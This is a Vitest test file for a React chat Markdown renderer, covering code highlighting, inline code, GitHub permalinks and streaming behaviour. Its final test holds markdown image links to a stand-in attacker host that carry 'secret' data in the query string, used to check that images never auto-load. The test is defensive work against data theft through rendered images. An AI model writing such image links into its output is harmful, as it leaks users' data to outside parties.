import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "@/components/chat/Markdown";

describe("chat markdown code blocks", () => {
  it("highlights fenced source code and labels its language", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: '```python\ndef project(point):\n    return "pixel"\n```',
      }),
    );

    expect(html).toContain("python");
    expect(html).toContain("language-python");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain("hljs-title");
    expect(html).toContain("hljs-string");
    expect(html).toContain('aria-label="Copy code"');
  });

  it("keeps inline code compact and outside the highlighted frame", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: "Use `torch.linalg.lstsq` for the solve.",
      }),
    );

    expect(html).toContain("<code>torch.linalg.lstsq</code>");
    expect(html).not.toContain("hljs");
    expect(html).not.toContain('aria-label="Copy code"');
  });

  it("renders precise GitHub code permalinks inline with their claims", () => {
    const permalink =
      "https://github.com/example/research/blob/0123456789abcdef0123456789abcdef01234567/src/train.py#L10-L24";
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: `The optimizer is initialized in [src/train.py#L10-L24](${permalink}).`,
      }),
    );

    expect(html).toContain(
      `The optimizer is initialized in <a href="${permalink}">src/train.py#L10-L24</a>.`,
    );
  });

  it("can defer syntax highlighting while a response is streaming", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content: "```\nconst answer = 42;\n```",
        highlightCode: false,
        copyCode: false,
      }),
    );

    expect(html).toContain("const answer = 42;");
    expect(html).not.toContain("hljs");
    expect(html).not.toContain('aria-label="Copy code"');
  });

  it("never auto-loads an image the answer points at", () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, {
        content:
          "![leak](https://attacker.example/collect?data=secret)\n\n![](https://attacker.example/pixel.png)",
      }),
    );

    expect(html).not.toContain("<img");
    expect(html).toContain("https://attacker.example/collect?data=secret");
    expect(html).toContain("leak");
  });
});
